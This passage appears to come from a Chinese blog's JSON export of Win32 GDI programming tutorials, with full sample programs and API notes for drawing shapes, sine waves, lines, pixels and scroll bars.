MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW , 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... //画矩形 Rectangle(hdc,200,50,600,400); //画椭圆或正圆 Ellipse(hdc, 200, 50, 600, 400); //画带圆角的矩形 RoundRect(hdc, 700, 50, 1100, 400,100,100); //画弦 Chord(hdc, 450,500,800,850, 20, 600, 1200, 400); //画弧 Arc(hdc, 850, 500, 1000, 650, 20, 600, 1200, 400); //画圆饼 Pie(hdc,50,500,400,850,500,0,50,650); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"正弦波","slug":"pwcp012-正弦波","date":"2021-06-07T10:49:41.000Z","updated":"2021-06-07T11:12:28.817Z","comments":true,"path":"2021/06/07/pwcp012-正弦波/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/07/pwcp012-正弦波/","excerpt":"","text":"正弦波 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205// 正弦波.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"正弦波.h\"#include&lt;math.h&gt;#define MAX_LOADSTRING 100//点的数量#define NUM 1000//波的数量10#define TWOPI (10 * 3.14159265)// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;// MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; static int cxClient, cyClient; POINT apt[NUM]; switch (message) &#123; case WM_SIZE: cxClient = LOWORD(lParam); cyClient = HIWORD(lParam); break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); MoveToEx(hdc,0,cyClient / 2,NULL); LineTo(hdc,cxClient,cyClient / 2); //将正弦波点分成NUM份 for (int i = 0; i &lt; NUM; i++) &#123; apt[i].x = i * cxClient / NUM; apt[i].y = (int) cyClient/2 *(1 - sin(i * TWOPI/NUM)); &#125; //连接点 Polyline(hdc,apt,NUM); // TODO: 在此处添加使用 hdc 的任何绘图代码... EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"画直线","slug":"pwcp011-画直线","date":"2021-06-07T09:32:12.000Z","updated":"2021-06-07T09:51:03.222Z","comments":true,"path":"2021/06/07/pwcp011-画直线/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/07/pwcp011-画直线/","excerpt":"","text":"画直线 POINT坐标结构类型 12345typedef struct tagPOINT&#123; LONG x; LONG y;&#125; POINT, *PPOINT, NEAR *NPPOINT, FAR *LPPOINT; MoveToEx设置当前画笔位置 123456WINGDIAPI BOOL WINAPI MoveToEx(HDC hdc,int X,int Y,LPPOINT lpPoint); HDC hdc：传入参数，设备上下文句柄。 int X：传入参数：新位置的X坐标。 int Y：传入参数：新位置的Y坐标。 LPPOINT lpPoint：传出参数：一个指向POINT结构的指针，用来存放上一个点的位置，若此参数为NULL，则不保存上一个点的位置 返回值： 返回TRUE代表移动成功，FALSE代表失败，用GetLastError获得更具体的错误信息 1MoveToEx(hdc, 20, 20, NULL); LineTo从画笔当前位置画到终点位置 1WINGDIAPI BOOL WINAPI LineTo(HDChdc,intX,intY,); hdc:设备场景句柄 X:线段终点X坐标位置，采用逻辑坐标表示。这个点不会实际画出来；它不属于线段的一部份 Y:线段终点Y坐标位置，采用逻辑坐标表示。这个点不会实际画出来；它不属于线段的一部份 返回值： 返回TRUE代表移动成功，FALSE代表失败 12//从起点画到200, 20,并改变当前画笔位置LineTo(hdc, 200, 20); Polyline 从apt数组中获取坐标点,画一个矩形,不改变当前画笔位置 1BOOL Polyline( HDChdc, CONST POINT*lppt, intcPoints) hdc ------------ Long，要在其中绘图的设备场景 lpPoint -------- POINTAPI，nCount POINTAPI结构数组中的第一个POINTAPI结构 nCount --------- Long，lpPoint数组中的点数。会从第一个点到第二个点画一条线，以次类推 返回值: bool，非零表示成功，零表示失败 123456789 POINT apt[5] = &#123; &#123;600,30&#125;, &#123;800,30&#125;, &#123;800,500&#125;, &#123;600,500&#125;, &#123;600,30&#125; &#125;;//从apt数组中获取坐标点,画一个矩形,不改变当前画笔位置Polyline(hdc,apt,5); PolylineTo 从apt2数组中获取坐标点,画一个矩形,并改变当前画笔位置 使用目前位置作为开始点，并将目前位置设定为最后一根线的终点,根据apt的点依次画直线。设置目前位置可调用MoveToEx函数. 1BOOL PolyLineTo(HDC hdc, CONST POINT * apt, DWORD cpt); 参数： hdc:设备场景句柄 apt:nCount POINTAPI结构数组中的第一个POINTAPI结构 cpt:Point数组中的点数 123456789101112POINT apt2[5] = &#123; &#123; 900,30 &#125;, &#123; 1200,30 &#125;, &#123; 1200,500 &#125;, &#123; 900,500 &#125;, &#123; 900,30 &#125;&#125;;//设置当前画笔位置MoveToEx(hdc, apt2[0].x, apt2[0].y, NULL);//从apt2数组中获取坐标点,画一个矩形,改变当前画笔位置PolylineTo(hdc, apt2 + 1, 4); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227// 直线.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"直线.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; //POINT 坐标结构类型 /* typedef struct tagPOINT &#123; LONG x; LONG y; &#125; POINT, *PPOINT, NEAR *NPPOINT, FAR *LPPOINT; */ //第二个矩形 POINT apt[5] = &#123; &#123;600,30&#125;, &#123;800,30&#125;, &#123;800,500&#125;, &#123;600,500&#125;, &#123;600,30&#125; &#125;; //第三个矩形 POINT apt2[5] = &#123; &#123; 900,30 &#125;, &#123; 1200,30 &#125;, &#123; 1200,500 &#125;, &#123; 900,500 &#125;, &#123; 900,30 &#125; &#125;; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... //设置起点位置 MoveToEx(hdc, 20, 20, NULL); //从起点画到200, 20,并改变当前画笔位置 LineTo(hdc, 200, 20); //从当前画笔位置,画到200, 500 LineTo(hdc, 200, 500); LineTo(hdc, 20, 500); LineTo(hdc, 20, 20); //从apt数组中获取坐标点,画一个矩形,不改变当前画笔位置 Polyline(hdc,apt,5); //设置当前画笔位置 MoveToEx(hdc, apt2[0].x, apt2[0].y, NULL); //从apt2数组中获取坐标点,画一个矩形,改变当前画笔位置 PolylineTo(hdc, apt2 + 1, 4); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"设定像素点","slug":"pwcp010-设定像素点","date":"2021-06-05T05:59:49.000Z","updated":"2021-06-05T06:11:47.909Z","comments":true,"path":"2021/06/05/pwcp010-设定像素点/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/05/pwcp010-设定像素点/","excerpt":"","text":"COLORREF 颜色类型 实际上是 unsigned long RGB宏 RGB(红,绿,蓝); SetPixel 指定坐标处的像素设为指定的颜色 1COLORREF SetPixel(HDC hdc, int X, int Y, COLORREF crColor)； 1SetPixel(hdc,i,j,color); GetPixel 1COLORREF GetPixel(HDC hdc, int nXPos, int nYPos) hdc：设备环境句柄。 nXPos：指定要检查的像素点的逻辑X轴坐标。 nYPos：指定要检查的像素点的逻辑Y轴坐标。 1color = GetPixel(hdc,200,200); GetRValue宏 获取红色值 1red = GetRValue(color); GetGValue宏 获取绿色值 1green = GetGValue(color); GetBValue宏 获取蓝色值 1blue = GetBValue(color);","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"新滚动条","slug":"pwcp009-新滚动条","date":"2021-06-02T08:05:19.000Z","updated":"2021-06-05T06:11:44.691Z","comments":true,"path":"2021/06/02/pwcp009-新滚动条/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/02/pwcp009-新滚动条/","excerpt":"","text":"新滚动条 SCROLLINFO 12345678910typedef struct tagSCROLLINFO&#123;UINT cbSize ; // set to sizeof (SCROLLINFO)UINT fMask ; // values to set or getint nMin; // 滚动条最小值int nMax; // 滚动条最大值UINT nPage ; // 一页大小int nPos ; int nTrackPos ; // 当前滑块位置&#125;SCROLLINFO,*LPSCROLLINFO; SetScrollInfo 设置滚动条参数 1int setscrollinfo(hwnd hwnd,int fnbar,lpscrollinfo lpsi,bool fredraw); 参数： hWnd：滚动条控件或带标准滚动条的窗体句柄，由fnBar参数决定。 fnBar：指定被设定参数的滚动条的类型。这个参数可以是下面值，含义如下： SB_CTL：设置滚动条控件。而参数hwnd必须是滚动条控件的句柄。 SB_HORZ：设置所给定的窗体上标准水平滚动条参数。 SB_VERT：设置所给定的窗体上标准垂直滚动条参数。 lpsi：指向SCROLLINFO结构。在调用SetScrollInfo之前，设置SCROLLINFO结构中cbSize成员以标识结构大小，设置成员fMask以说明待设置的滚动条参数，并且在适当的成员中制定新的参数值。成员fMask可以为下面所列复合值，含义如下： SIF_DISABLENOSCROLL：如果滚动条的新参数使其为没必要，则使滚动条无效而不再移动它。 SIF_PAGE：设置滚动页码值到由Ipsi指向的SCROLLINFO结构的nPage成员中。 SIF_POS：设置滚动位置值到由lpsi指向的SCROLLINFO结构的nPos成员中。 SIF_RANGE：设置滚动范围值到由lpsl指向的SCROLLINFO结构的nMin和nMax成员中。 fRedraw：指定滚动条是否重画以反映滚动条的变化。如果这个参数为TRUE，滚动条将被重画，否则不被重画。 1234//设置SIF_POSsi.fMask = SIF_POS;//设置滑块位置SetScrollInfo(hWnd,SB_VERT,&amp;si,TRUE); GetScrollInfo 获取滚动条的参数 1BOOL GetScrollInfo( HWND hWnd, int fnBar, LPSCROLLINFO lpsi ); 参数： hWnd：滚动条控制或有标准滚动条的窗体句柄，由fnBar参数确定。 fnBar：指定待找回滚动条参数的类型，此参数可以为如下值，其值含义： SB_CTL：找回滚动条控制参数。其中参数hwnd一定是处理滚动条控制的句柄。 SB_HORZ：找回所指定窗体的标准水平滚动条参数。 SB_VERT：找回所指定窗体的标准垂直滚动条参数。 lpsi：指向SCROLLINFO结构。 1GetScrollInfo(hWnd, SB_VERT, &amp;si); ScrollWindow 函数滚动所指定的窗口客户区域内容。 1BOOL ScrollWindow(HWND hWnd, int XAmount, int YAmount, CONST RECT *IpRect, CONST RECT *lpClipRect); hWnd [in]客户区域将被滚动的窗口的句柄。 XAmount [in]指定水平滚动的距离，以设备单位计。如果窗口类风格为CS_OWNDC或CS_CLASSDC，则此参数则使用逻辑单位而非设备单位。当向左滚动窗体内容时，参数值必须为负。 YAmount [in]指定垂直滚动的距离，以设备单位计。如果窗口类风格为CS_OWNDC或CS_CLASSDC，则此参数则使用逻辑单位而非设备单位。当向上滚动窗体内容时，参数值必须为负。 lpRect [in]指向RECT结构的指针，该结构指定了将要滚动的客户区范围。若此参数为NULL，则整个客户区域将被滚动。 lpClipRect [in]指向RECT结构的指针，该结构指定了要滚动的裁剪区域。只有这个矩形中的位才会被滚动。在矩形之外的位不会被影响，即使它们是在lpRect矩形之内。(见代码&quot;测试一&quot;)假如lpClipRect为NULL，则不会在滚动矩形上进行裁剪。 1ScrollWindow(hWnd, 0, cyChar * (iVertPos - si.nPos),NULL,NULL); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308// 滚动条2.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"滚动条2.h\"#define MAX_LOADSTRING 100#define MAX_LINE 1024// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY2, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY2)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY2)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;// MAKEINTRESOURCEW(IDC_MY2); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW | WS_VSCROLL, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; SCROLLINFO si; static TEXTMETRIC tm; //获取字体信息 static int cxChar; //字体宽度 static int cyChar; //字体高度 HDC hdc; static int iVscrollPos; //当前滑块位置 static TCHAR szBuffer[1024][1024] = &#123; 0 &#125;; static int cyClient; //当前客户区高度大小 static int cxClient; //当前客户区宽度大小 static int iVertPos; static int iPaintBeg; static int iPaintEnd; switch (message) &#123; case WM_SIZE: //获取客户区的高度 cyClient = HIWORD(lParam); //获取客户区的宽度 cxClient = LOWORD(lParam); //初始化si结构大小 si.cbSize = sizeof(si); //设置可用标志 //SIF_RANGE:使用nMin和nMax成员 //SIF_PAGE:使用nPage成员 si.fMask = SIF_RANGE | SIF_PAGE; //设置一页大小 si.nPage = cyClient / cyChar; //设置滚动条最小值 si.nMin = 0; //设置滚动条最大值 si.nMax = MAX_LINE - 1; //设置滚动条参数 SetScrollInfo(hWnd,SB_VERT,&amp;si,TRUE); //窗口设置为失效 InvalidateRect(hWnd, NULL, TRUE); //更新窗口 UpdateWindow(hWnd); break; case WM_VSCROLL: si.cbSize = sizeof(si); //SIF_ALL:所有成员可用 si.fMask = SIF_ALL; //获取滚动条信息 GetScrollInfo(hWnd,SB_VERT,&amp;si); iVertPos = si.nPos; //获取滚动条操作的消息 switch (LOWORD(wParam)) &#123; //向上滚动一行 case SB_LINEUP: si.nPos -= 1; break; //向下滚动一行 case SB_LINEDOWN: si.nPos += 1; break; //向下滚动一页 case SB_PAGEDOWN: si.nPos += si.nPage; break; //向上滚动一页 case SB_PAGEUP: si.nPos -= si.nPage; break; //拖动滑块时 case SB_THUMBTRACK: si.nPos = si.nTrackPos; break; &#125; //设置SIF_POS si.fMask = SIF_POS; //设置滑块位置 SetScrollInfo(hWnd,SB_VERT,&amp;si,TRUE); //获取滚动条信息 GetScrollInfo(hWnd, SB_VERT, &amp;si); //如果滑块位置不等于当前滑块位置 if (si.nPos != iVertPos) &#123; //滚动所指定的窗口客户区域内容 ScrollWindow(hWnd, 0, cyChar * (iVertPos - si.nPos),NULL,NULL); UpdateWindow(hWnd); &#125; break; case WM_CREATE: hdc = GetDC(hWnd); GetTextMetrics(hdc, &amp;tm); cxChar = tm.tmAveCharWidth; cyChar = tm.tmHeight + tm.tmExternalLeading; ReleaseDC(hWnd, hdc); for (int i = 0; i &lt; MAX_LINE; i++) &#123; _sntprintf(szBuffer[i], 1024, TEXT(\"Hello %d \"), i + 1); &#125; break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; int x; int y; HDC hdc = BeginPaint(hWnd, &amp;ps); si.cbSize = sizeof si; 